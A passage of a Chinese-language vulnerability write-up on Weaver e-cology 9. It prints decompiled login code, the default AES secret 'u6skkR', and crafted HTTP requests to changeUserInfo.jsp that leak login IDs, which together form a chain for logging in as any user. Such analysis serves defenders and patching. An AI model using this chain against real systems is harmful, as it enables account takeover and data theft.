src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519164856242.png"></p><p>最开头根据<code>syscode</code>、<code>receiver</code>、<code>timestamp</code>、<code>loginTokenFromThird</code>、<code>gopage</code>参数接收相应的参数值，然后对<code>loginTokenFromThird</code>参数值进行判断是否等于<code>loginTokenFromThird2</code>的值，如果不等于则会登录失败跳转至<code>/login/Login.jsp</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">toURL</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger();</span><br><span class="line"><span class="type">String</span> <span class="variable">syscode</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;syscode&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">receiver</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;receiver&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">timestamp</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;timestamp&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">loginTokenFromThird</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;loginTokenFromThird&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">gopage</span> <span class="operator">=</span> URLDecoder.decode(request.getParameter(<span class="string">&quot;gopage&quot;</span>),<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">loginTokenFromThird2</span> <span class="operator">=</span>  AESCoder.encrypt(receiver+timestamp, syscode+Prop.getPropValue(<span class="string">&quot;transferE9&quot;</span>,<span class="string">&quot;secretkey&quot;</span>));</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;=======================登陆认证开始=================================&quot;</span>);</span><br><span class="line">log.info(<span class="string">&quot;syscode：&quot;</span>+syscode);</span><br><span class="line">log.info(<span class="string">&quot;receiver：&quot;</span>+receiver);</span><br><span class="line">log.info(<span class="string">&quot;timestamp：&quot;</span>+timestamp);</span><br><span class="line">log.info(<span class="string">&quot;loginTokenFromThird ：&quot;</span>+loginTokenFromThird);</span><br><span class="line">log.info(<span class="string">&quot;gopage：&quot;</span>+gopage);</span><br><span class="line">log.info(<span class="string">&quot;loginTokenFromThird2：&quot;</span>+loginTokenFromThird2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!loginTokenFromThird.equalsIgnoreCase(loginTokenFromThird2))&#123;</span><br><span class="line">    log.info(<span class="string">&quot;登陆失败！&quot;</span>);</span><br><span class="line">        <span class="comment">//response.sendRedirect(&quot;/login/Login.jsp&quot;);</span></span><br><span class="line">    toURL = <span class="string">&quot;/login/Login.jsp&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看看<code>Prop.getPropValue(&quot;transferE9&quot;,&quot;secretkey&quot;)</code>是干嘛的，相关代码如下，其实就是获取<code>prop/transferE9.properties</code>文件中<code>secretkey</code>的值，是<code>u6skkR</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Properties <span class="title function_">loadTemplateProp</span><span class="params">(String var0)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(PROP_ROOT + var0 + <span class="string">&quot;.properties&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!var8.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">var3</span> <span class="operator">=</span> var8.lastModified();</span><br><span class="line">            <span class="type">Long</span> <span class="variable">var5</span> <span class="operator">=</span> (Long)htmlfileTime.get(var0);</span><br><span class="line">            <span class="keyword">if</span> (var5 == <span class="literal">null</span> || var5 != var3) &#123;</span><br><span class="line">                var1 = <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">                <span class="type">BufferedInputStream</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(var8));</span><br><span class="line">                var1.load(var6);</span><br><span class="line">                var6.close();</span><br><span class="line">                htmlfileHash.put(var0, var1);</span><br><span class="line">                htmlfileTime.put(var0, <span class="keyword">new</span> <span class="title class_">Long</span>(var3));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (Properties)htmlfileHash.get(var0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        <span class="type">LogMan</span> <span class="variable">var2</span> <span class="operator">=</span> LogMan.getInstance();</span><br><span class="line">        var2.writeLog(<span class="string">&quot;Prop.class&quot;</span>, var7);</span><br><span class="line">        var2.writeLog(<span class="string">&quot;root path is : &quot;</span> + PROP_ROOT);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPropValue</span><span class="params">(String var0, String var1)</span> &#123;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">var2</span> <span class="operator">=</span> loadTemplateProp(var0);</span><br><span class="line">    <span class="keyword">return</span> var2 != <span class="literal">null</span> &amp;&amp; var2.getProperty(var1) != <span class="literal">null</span> ? var2.getProperty(var1).trim() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就变成如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loginTokenFromThird2 = AESCoder.encrypt(receiver+timestamp, syscode+<span class="string">&quot;u6skkR&quot;</span>);</span><br></pre></td></tr></table></figure><p>继续看<code>AESCoder.encrypt</code>方法，一种基于AES算法的加密方法。</p><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519171839628.png"></p><p>那么当<code>loginTokenFromThird</code>参数值等于<code>loginTokenFromThird2</code>的值即<code>AESCoder.encrypt(receiver+timestamp, syscode+&quot;u6skkR&quot;)</code>时，则继续往下进入到else分支。</p><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519175427532.png"></p><p>首先是根据<code>syscode</code>参数值进行的一句SQL查询，根据<code>syscode</code>的值从<code>ofs_sendinfo</code>表中查询<code>hrmtransrule</code>的值。如果从表中查询到的<code>hrmtransrule</code>的值为空，则赋值字符串<code>&quot;1&quot;</code>为<code>hrmtransrule</code>参数的值。接着根据<code>hrmtransrule</code>参数值的不同，对<code>rule</code>参数赋不同的值，当然如果<code>hrmtransrule</code>参数值不等于<code>&quot;0&quot;</code>&#x2F;<code>&quot;1&quot;</code>&#x2F;<code>&quot;2&quot;</code>&#x2F;<code>&quot;3&quot;</code>&#x2F;<code>&quot;4&quot;</code>其中一个，它就默认等于<code>&quot;loginid&quot;</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">rs.executeQuery(<span class="string">&quot;select hrmtransrule from ofs_sendinfo where syscode = ?&quot;</span>,syscode);</span><br><span class="line">rs.next();</span><br><span class="line"><span class="type">String</span> <span class="variable">hrmtransrule</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;hrmtransrule&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(StringUtils.isBlank(hrmtransrule))&#123;</span><br><span class="line">    hrmtransrule = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">log.info(<span class="string">&quot;hrmtransrule:&quot;</span>+hrmtransrule);</span><br><span class="line"></span><br><span class="line"><span class="type">User</span> <span class="variable">user_new</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">rule</span> <span class="operator">=</span> <span class="string">&quot;loginid&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;0&quot;</span>.equals(hrmtransrule))&#123;</span><br><span class="line">    rule = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(hrmtransrule))&#123;</span><br><span class="line">    rule = <span class="string">&quot;loginid&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(hrmtransrule))&#123;</span><br><span class="line">    rule = <span class="string">&quot;workcode&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;3&quot;</span>.equals(hrmtransrule))&#123;</span><br><span class="line">    rule = <span class="string">&quot;certificatenum&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;4&quot;</span>.equals(hrmtransrule))&#123;</span><br><span class="line">    rule = <span class="string">&quot;email&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不妨先看看<code>ofs_sendinfo</code>表中的字段以及对应的值，查询结果如下，表中默认只存在一条数据，而且<code>hrmtransrule</code>字段的值为<code>NULL</code>。意味着在默认情况下，无论<code>syscode</code>参数值是什么，都不影响查询出来的<code>hrmtransrule</code>是一个空值，这将导致代码中的<code>hrmtransrule</code>变量值为<code>&quot;1&quot;</code>，然后<code>rule</code>就为<code>&quot;loginid&quot;</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ofs_sendinfo;</span><br><span class="line"></span><br><span class="line">idsyscodeserverurlclassimplisvalidsysdeschrmtransrulesend_type_setting</span><br><span class="line"><span class="number">1</span>IMweaver.ofs.interfaces.SendRequestStatusDataImplForIM<span class="number">1</span><span class="keyword">For</span> IM<span class="keyword">NULL</span><span class="keyword">NULL</span></span><br></pre></td></tr></table></figure><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519224717665.png"></p><p>之后，根据<code>rule</code>参数值等于<code>&quot;loginid&quot;</code>，又进行了一次SQL查询，这次是从<code>HrmResource</code>表中进行查询。此处的<code>?</code>表示一个占位符号，在这里意味着<code>receiver</code>变量的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from HrmResource where &quot;</span>+rule+<span class="string">&quot; = ? and status &lt; 4 &quot;</span>;</span><br><span class="line">log.info(<span class="string">&quot;sql：&quot;</span>+sql);</span><br><span class="line">rs.executeQuery(sql,receiver);</span><br></pre></td></tr></table></figure><p>如果查询成功，就从查询结果中取<code>id</code>字段的值，并赋值给变量<code>userId</code>。接着就根据<code>userId</code>去创建对应用户的Session，最后判断<code>result</code>中的<code>status</code>是否为<code>&quot;1&quot;</code>，如果不是则跳转至登录页面，如果是就会跳转至<code>gopage</code>参数对应的路径，若<code>gopage</code>参数的值为<code>/wui/index.html</code>，则会跳转至后台，完成用户登录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(rs.next())&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> rs.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    Map&lt;String, Object&gt; result = (Map&lt;String, Object&gt;)SessionUtil.createSession(userId + <span class="string">&quot;&quot;</span>, request, response);</span><br><span class="line">    log.info(<span class="string">&quot;登陆结果result:&quot;</span>+result);</span><br><span class="line"></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) request.getSession(<span class="literal">true</span>).getAttribute(<span class="string">&quot;weaver_user@bean&quot;</span>);</span><br><span class="line">    log.info(<span class="string">&quot;登陆结果user:&quot;</span>+ JSON.toJSONString(user));</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">status</span> <span class="operator">=</span> (String)result.get(<span class="string">&quot;status&quot;</span>);</span><br><span class="line">    log.info(<span class="string">&quot;=======================登陆认证结束=================================&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(status))&#123;</span><br><span class="line">        <span class="comment">//response.sendRedirect(gopage);</span></span><br><span class="line">        <span class="comment">//return;</span></span><br><span class="line">        toURL = gopage;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        toURL = <span class="string">&quot;/login/Login.jsp&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个过程中，关键就在于<code>receiver</code>参数的值。不过的是，默认情况下<code>HrmResource</code>是一张空表，如下是其各个字段。这也意味着该漏洞在<code>HrmResource</code>表为空的情况下是不可利用的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> HrmResource;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idloginidpasswordlastnamesexbirthdaynationalitysystemlanguagemaritalstatustelephonemobilemobilecallemaillocationidworkroomhomeaddressresourcetypestartdateenddatejobtitlejobactivitydescjoblevelsecleveldepartmentidsubcompanyid1costcenteridmanageridassistantidbankid1accountid1resourceimageidcreateridcreatedatelastmodidlastmoddatelastlogindatedatefield1datefield2datefield3datefield4datefield5numberfield1numberfield2numberfield3numberfield4numberfield5textfield1textfield2textfield3textfield4textfield5tinyintfield1tinyintfield2tinyintfield3tinyintfield4tinyintfield5certificatenumnativeplaceeducationlevelbememberdatebepartydateworkcoderegresidentplacehealthinforesidentplacepolicydegreeheightusekindjobcallaccumfundaccountbirthplacefolkresidentphoneresidentpostcodeextphonemanagerstrstatusfaxislabouunionweighttempresidentnumberprobationenddatecountryidpasswdchgdateneedusbserialaccountlloginidneeddynapassdsporderpasswordstateaccounttypebelongtodactylogramassistantdactylogrampasswordlocksumpasswordwrongoldpassword1oldpassword2msgStylemessagerurlpinyinlastnametokenkeyuserUsbTypeoutkeyadsjgsadgsadbmmobileshowtypeusbstatetotalSpaceoccupySpaceecology_pinyin_searchisADAccountaccountnamenotallotbeforefrozenresourcefromisnewuserhaschangepwdcreatedcreatermodifiedmodifierpasswordlocktimemobilecaflagsaltcompanystartdateworkstartdatesecondaryPwduseSecondaryPwdclassificationuuidpasswordLockReasoncompanyworkyearworkyearDISMISSDATEencKeycrc</span><br></pre></td></tr></table></figure><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519231925736.png"></p><p>登入系统后台新建一名人员，再看<code>HrmResource</code>表发生的变化。</p><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-202305201752562374.png"></p><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230523110130299.png"></p><p>如上图，其中<code>status</code>字段代表的是人员的状态，有试用&#x2F;正式&#x2F;临时三种状态，显然<code>1</code>对应的是正式状态，只要满足这个值小于4即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rs.executeQuery(<span class="string">&quot;select * from HrmResource where loginid = ? and status &lt; 4 &quot;</span>, receiver);</span><br></pre></td></tr></table></figure><p>那么现在<code>HrmResource</code>表不为空，只要当<code>receiver</code>变量值为<code>&quot;user1&quot;</code>，便能够对应上<code>HrmResource</code>表中的<code>loginid</code>字段的值，最终就能够成功地实现任意用户登录。</p><h3 id="信息泄漏分析"><a href="#信息泄漏分析" class="headerlink" title="信息泄漏分析"></a>信息泄漏分析</h3><p>通过如上的任意用户登录漏洞分析，可以明白该漏洞的利用条件是，需要已知一个存在于<code>HrmResource</code>表中的<code>loginid</code>。接下来来看<code>/mobile/plugin/changeUserInfo.jsp</code>文件以做进一步的<code>loginid</code>信息泄漏漏洞分析。</p><p>根据补丁代码，快速定位到存在问题的代码。如下，当<code>type</code>等于<code>&quot;getLoginid&quot;</code>时。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;type&quot;</span>));</span><br><span class="line"><span class="type">String</span> <span class="variable">mobile</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;mobile&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;getLoginid&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">loginId</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">RecordSet</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select count(LOGINID) count from HRMRESOURCE where mobile like ?&quot;</span>;</span><br><span class="line">rs.executeQuery(sql,<span class="string">&quot;%&quot;</span>+mobile+<span class="string">&quot;%&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(rs.next())&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> Util.getIntValue(rs.getString(<span class="string">&quot;count&quot;</span>),<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">0</span>)&#123;</span><br><span class="line">result.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;-1&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(count &gt;<span class="number">1</span>)&#123;</span><br><span class="line">result.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(count == <span class="number">1</span>)&#123;</span><br><span class="line">result.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="type">RecordSet</span> <span class="variable">rs1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql1</span> <span class="operator">=</span> <span class="string">&quot;select LOGINID from HRMRESOURCE where mobile like ?&quot;</span>;</span><br><span class="line">rs1.executeQuery(sql1,<span class="string">&quot;%&quot;</span>+mobile+<span class="string">&quot;%&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(rs1.next())&#123;</span><br><span class="line">result.put(<span class="string">&quot;loginId&quot;</span>, rs1.getString(<span class="string">&quot;LOGINID&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查询时使用了<code>%</code>，可以模糊匹配<code>mobile</code>，当查询出的结果条数为0时，返回<code>&#123;&quot;status&quot;:&quot;-1&quot;&#125;</code>。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/plugin/changeUserInfo.jsp?type=getLoginid&amp;mobile=1234</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>WVS</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>private</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-UA-Compatible</span><span class="punctuation">: </span>IE=8</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>ecology_JSessionid=aaa18FCpyjT4M7qjA1VCy; path=/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>17</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 19 May 2023 01:41:30 GMT</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;-1&quot;</span><span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"></span></span><br><span class="line"><span class="language-json"></span></span><br></pre></td></tr></table></figure><p>当大于1时返回<code>&#123;&quot;status&quot;:&quot;0&quot;&#125; </code>，如下。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/plugin/changeUserInfo.jsp?type=getLoginid&amp;mobile=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>WVS</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>private</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-UA-Compatible</span><span class="punctuation">: </span>IE=8</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>ecology_JSessionid=aaazz3rlfOPGyh_GFNZly; path=/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 19 May 2023 01:42:50 GMT</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;0&quot;</span><span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"></span></span><br><span class="line"><span class="language-json"></span></span><br></pre></td></tr></table></figure><p>在这种情况下，是可以利用BurpSuite的Intruder做进一步模糊查询移动电话的。如下第二张图，存在一个包含17的移动电话，以及多个包含18的移动电话。</p><p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520113512246.png"></p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520113701520.png" alt="image-20230520113701520" style="zoom: 50%;" /><p>当等于1时返回<code>&#123;&quot;status&quot;:&quot;1&quot;&#125; </code>以及<code>loginId</code>及其值，在这种情况下，我们就可以直接获取一个<code>loginId</code>。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/plugin/changeUserInfo.jsp?type=getLoginid&amp;mobile=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 